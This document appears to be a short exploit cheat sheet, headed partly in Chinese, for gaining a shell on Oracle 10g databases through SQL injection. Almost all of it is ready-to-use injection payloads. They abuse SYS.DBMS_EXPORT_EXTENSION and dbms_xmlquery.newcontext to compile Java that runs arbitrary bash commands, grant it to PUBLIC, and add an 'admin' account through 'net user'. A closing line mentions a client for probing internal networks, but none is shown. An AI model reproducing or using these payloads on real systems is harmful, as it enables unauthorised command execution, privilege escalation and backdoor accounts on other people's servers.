# oracle 10g 正向连接 Linux shell

## oracle 10g sys user getshell by java. (Linux payload)

### use `SYS.DBMS_EXPORT_EXTENSION`
```
1. id=1||(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "LinuxUtil" as import java.io.*; public class LinuxUtil extends Object {public static String runCMD(String args) {try{String[] cmd=new String[3];cmd[0]="/bin/bash";cmd[1]="-c";cmd[2]=args;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(cmd).getInputStream())); String stemp,str="";while ((stemp = myReader.readLine()) != null) str %2B=stemp%2B"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'''';END;'';END;--','SYS',0,'1',0) from dual)-- Tort

2. id=1||(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual)

3. id=1||(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinuxRunCMD(p_cmd in varchar2)  return varchar2  as language java name ''''''''LinuxUtil.runCMD(java.lang.String) return String'''''''';   '''';END;'';END;--','SYS',0,'1',0) from dual)-- Tort

4. id=1||(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinuxRunCMD to public'''';END;'';END;--','SYS',0,'1',0) from dual)-- Tort
```
### use `dbms_xmlquery.newcontext() public role`
```
1. id=1||select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;  begin execute immediate ''create or replace and resolve java source named JAVACMDas import java.lang.*;import java.io.*;public  class JAVACMD{public static void execmd(String command) throws IOException{Runtime.getRuntime().exec(command);}}''; commit;  end;') from dual;

2. id=1||select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;  begin execute immediate ''create or replace procedure MYJAVACMD(command in varchar) as language java name  ''''JAVACMD.execmd(java.lang.String)''''; ''; commit;end;') from dual;

3. id=1||select dbms_xmlquery.newcontext('begin myjavacmd(''net user admin admin /add'')  ;commit;end;') from dual;
```
## use this client to get a non-interactive shell and detect Internal network

